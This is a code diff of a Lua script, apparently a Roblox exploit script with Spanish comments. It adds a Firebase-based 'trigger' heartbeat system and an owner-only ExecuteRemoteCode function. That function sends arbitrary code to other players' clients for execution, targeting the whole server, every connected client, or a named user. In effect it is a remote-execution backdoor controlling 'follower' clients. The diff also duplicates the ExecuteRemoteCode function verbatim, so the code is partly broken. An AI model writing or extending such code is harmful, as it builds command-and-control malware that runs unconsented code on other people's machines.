@@ -1039,17 +1039,38 @@ local function SendHeartbeat()
         end
 
 
-        -- ✅ -- ✅ LOOP PRINCIPAL DEL FOLLOWER
-task.spawn(function()
-    task.wait(2)
-    followerState.ownerOnline = CheckOwnerOnline()
-    followerState.lastOnlineCheck = tick()
-    -- ✅ Solo envía heartbeat si detectó owner/admin activo
-    if followerState.ownerOnline then
-        SendHeartbeat()
-    end
+-- ✅ LOOP PRINCIPAL DEL FOLLOWER
+        task.spawn(function()
+            task.wait(2)
+            followerState.ownerOnline = CheckOwnerOnline()
+            followerState.lastOnlineCheck = tick()
+            if followerState.ownerOnline then
+                SendHeartbeat()
+            end
+
             while true do
                 local now = tick()
+
+                -- ✅ Chequear trigger del owner cada 2s
+                if (now - followerState.lastTriggerCheck) >= 2 then
+                    followerState.lastTriggerCheck = now
+                    local ok, trigger = pcall(function()
+                        return firebaseRequest("GET", "/triggers/" .. currentServerId)
+                    end)
+                    if ok and trigger and type(trigger) == "table" then
+                        local triggerTime = trigger.timestamp or 0
+                        local triggerGame = tostring(trigger.place_id or "")
+                        local triggerServer = tostring(trigger.server_id or "")
+                        -- Solo respondo si el trigger es de MI server, MI juego, y es reciente (< 15s)
+                        if (os.time() - triggerTime) < 15
+                            and triggerGame == tostring(game.PlaceId)
+                            and triggerServer == currentServerId then
+                            SendHeartbeat()
+                            followerState.ownerOnline = true
+                            followerState.lastOnlineCheck = tick()
+                        end
+                    end
+                end
 
                 local recheckInterval = followerState.ownerOnline
                     and (followerState.heartbeatInterval * 3)
@@ -1058,9 +1079,12 @@ task.spawn(function()
                 if (now - followerState.lastOnlineCheck) >= recheckInterval then
                     followerState.ownerOnline = CheckOwnerOnline()
                     followerState.lastOnlineCheck = tick()
+                    if followerState.ownerOnline and followerState.lastHeartbeat == 0 then
+                        SendHeartbeat()
+                    end
                 end
 
-if followerState.ownerOnline then
+                if followerState.ownerOnline then
                     if (now - followerState.lastHeartbeat) >= followerState.heartbeatInterval then
                         SendHeartbeat()
                     end
@@ -1679,6 +1703,7 @@ local result = firebaseRequest("GET", "/heartbeats")
 
 detectBtn.MouseButton1Click:Connect(function()
     detectBtn.Text = "📡 Enviando señal..."
+    -- Sube MI heartbeat primero
     pcall(function()
         firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
             username  = LocalPlayer.Name,
@@ -1688,8 +1713,17 @@ detectBtn.MouseButton1Click:Connect(function()
             timestamp = os.time()
         })
     end)
-    detectBtn.Text = "⏳ Esperando respuestas..."
-    task.wait(3)
+    -- Envía trigger para que los followers respondan
+    pcall(function()
+        firebaseRequest("PUT", "/triggers/" .. currentServerId, {
+            sender_id = myUserId,
+            place_id  = tostring(game.PlaceId),
+            server_id = currentServerId,
+            timestamp = os.time()
+        })
+    end)
+    detectBtn.Text = "⏳ Esperando respuestas... (10s)"
+    task.wait(10) -- espera suficiente para que los followers lean el trigger y respondan
     UpdatePlayersList()
     task.wait(1)
     local count = 0
@@ -2108,53 +2142,122 @@ local cmdKey = tostring(os.time()) .. "_" .. myUserId
 if isOwner then
             local function ExecuteRemoteCode(code, target)
                 if code == "" then return end
-local execKey = tostring(os.time()) .. "_" .. myUserId
-                -- target puede ser ".all", ".s" (server), o un username
-                if target == ".s" or target == "" then
-                    -- Enviar a todos en el server actual
-                    local hearts = firebaseRequest("GET", "/heartbeats")
-                    if hearts and type(hearts) == "table" then
-                        local now = os.time()
-                        for uid, p in pairs(hearts) do
-                            if p.server_id == currentServerId and (now - (p.timestamp or 0)) < 60 then
-                                firebaseRequest("PUT", "/executions/" .. uid .. "/" .. execKey, {
-                                    sender_id = myUserId,
-                                    code      = code,
-                                    timestamp = os.time()
-                                })
-                            end
-                        end
+                target = (target or ".s"):gsub("^%s+", ""):gsub("%s+$", "")
+                local execKey = tostring(os.time()) .. "_exec_" .. myUserId
+                local sentCount = 0
+
+                local hearts = firebaseRequest("GET", "/heartbeats")
+                if not hearts or type(hearts) ~= "table" then
+                    executeBtn.Text = "❌ Sin jugadores detectados"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
+                    task.wait(2)
+                    executeBtn.Text = "▶ Ejecutar"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
+                    return
+                end
+
+                local now = os.time()
+
+                for uid, p in pairs(hearts) do
+                    -- ✅ Ignorar claves no numéricas como "error"
+                    if type(p) ~= "table" then continue end
+                    if tonumber(uid) == nil then continue end
+                    if tostring(uid) == tostring(myUserId) then continue end
+                    if (now - (p.timestamp or 0)) > 120 then continue end
+
+                    local matchServer = tostring(p.server_id or "") == tostring(currentServerId)
+                    local matchName = (p.username or ""):lower() == target:lower()
+
+                    local shouldSend = false
+                    if target == ".s" or target == "" then
+                        shouldSend = matchServer
+                    elseif target == ".all" then
+                        shouldSend = true
+                    else
+                        shouldSend = matchName
                     end
-                elseif target == ".all" then
-                    -- Enviar a absolutamente todos
-                    local hearts = firebaseRequest("GET", "/heartbeats")
-                    if hearts and type(hearts) == "table" then
-                        for uid, _ in pairs(hearts) do
-                            firebaseRequest("PUT", "/executions/" .. uid .. "/" .. execKey, {
+
+                    if shouldSend then
+                        pcall(function()
+                            firebaseRequest("PUT", "/executions/" .. tostring(uid) .. "/" .. execKey, {
                                 sender_id = myUserId,
                                 code      = code,
                                 timestamp = os.time()
                             })
-                        end
-                    end
-                else
-                    -- Buscar por username en heartbeats
-                    local hearts = firebaseRequest("GET", "/heartbeats")
-                    if hearts and type(hearts) == "table" then
-                        for uid, p in pairs(hearts) do
-                            if (p.username or ""):lower() == target:lower() then
-                                firebaseRequest("PUT", "/executions/" .. uid .. "/" .. execKey, {
-                                    sender_id = myUserId,
-                                    code      = code,
-                                    timestamp = os.time()
-                                })
-                            end
-                        end
+                        end)
+                        sentCount += 1
                     end
                 end
-                executeBtn.Text = "✓ Code Sent!"
-                executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
-                task.wait(1.5)
+
+                if sentCount > 0 then
+                    executeBtn.Text = "✓ Enviado a " .. sentCount .. " jugadores"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
+                else
+                    executeBtn.Text = "⚠️ Nadie encontrado"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
+                end
+                task.wait(2)
+                executeBtn.Text = "▶ Ejecutar"
+                executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
+            end
+
+            local function ExecuteRemoteCode(code, target)
+                if code == "" then return end
+                target = (target or ".s"):gsub("^%s+", ""):gsub("%s+$", "")
+                local execKey = tostring(os.time()) .. "_exec_" .. myUserId
+                local sentCount = 0
+
+                local hearts = firebaseRequest("GET", "/heartbeats")
+                if not hearts or type(hearts) ~= "table" then
+                    executeBtn.Text = "❌ Sin jugadores detectados"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
+                    task.wait(2)
+                    executeBtn.Text = "▶ Ejecutar"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
+                    return
+                end
+
+                local now = os.time()
+
+                for uid, p in pairs(hearts) do
+                    -- ✅ Ignorar claves no numéricas como "error"
+                    if type(p) ~= "table" then continue end
+                    if tonumber(uid) == nil then continue end
+                    if tostring(uid) == tostring(myUserId) then continue end
+                    if (now - (p.timestamp or 0)) > 120 then continue end
+
+                    local matchServer = tostring(p.server_id or "") == tostring(currentServerId)
+                    local matchName = (p.username or ""):lower() == target:lower()
+
+                    local shouldSend = false
+                    if target == ".s" or target == "" then
+                        shouldSend = matchServer
+                    elseif target == ".all" then
+                        shouldSend = true
+                    else
+                        shouldSend = matchName
+                    end
+
+                    if shouldSend then
+                        pcall(function()
+                            firebaseRequest("PUT", "/executions/" .. tostring(uid) .. "/" .. execKey, {
+                                sender_id = myUserId,
+                                code      = code,
+                                timestamp = os.time()
+                            })
+                        end)
+                        sentCount += 1
+                    end
+                end
+
+                if sentCount > 0 then
+                    executeBtn.Text = "✓ Enviado a " .. sentCount .. " jugadores"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
+                else
+                    executeBtn.Text = "⚠️ Nadie encontrado"
+                    executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
+                end
+                task.wait(2)
                 executeBtn.Text = "▶ Ejecutar"
                 executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
             end
